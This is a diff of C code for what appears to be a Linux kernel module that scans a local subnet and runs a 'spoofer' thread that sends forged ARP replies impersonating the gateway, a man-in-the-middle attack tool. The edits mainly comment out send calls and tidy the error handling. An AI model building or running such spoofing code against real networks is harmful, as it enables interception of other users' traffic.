@@ -18,6 +18,8 @@
 #include <linux/sched/signal.h> //send_sig()
 #include <linux/string.h>
 
+#include <linux/udp.h>
+
 //int sys_ip = inet_select_addr(dev, 0, RT_SCOPE_UNIVERSE);
 //inet_ioctl()
 //static struct inet_protosw inetsw_array[]
@@ -164,12 +166,9 @@ static void scanning(void)
 	for (; base < max; base++)
 	{
 		target = (net_ip | (htonl(base)));
-		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
-			0x12345678, netdev->broadcast, host.haddr, NULL);
-		//msleep_interruptible(1);
-		for (t = 0; t < 2000000; t++); //busy wating
+		//arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
+			//0x12345678, netdev->broadcast, host.haddr, NULL);
 	}	
-	printk("scanning: finished\n");	
 }
 
 static int spoofer(void * ptr)
@@ -194,15 +193,11 @@ static int spoofer(void * ptr)
 		if (others[who]->paddr == gw.paddr)
 			continue;
 
-		//printk("send spoof packet to %pI4\n", &others[who]->paddr);
-
 		//arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
 			//gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
-		//msleep_interruptible(1);
-		for (t = 0; t < 100000; t++);
+		msleep_interruptible(1);
 	}
 	
-	//restore routine
 	return 0;
 }
 
@@ -251,17 +246,13 @@ int spoof_init(void)
 		goto init_err;
 
 	if (!(ts = kthread_run(spoofer, NULL, "spoofer")))
-	{
-		unreg_arp_hook();
 		goto init_err;
-	}
-	else
-		printk("arp spoof start\n");
 
 	reg_ip_handler();
 	return 0;
 
 init_err:
+	unreg_arp_hook();
 	mem_free();
 	return -1;
 }
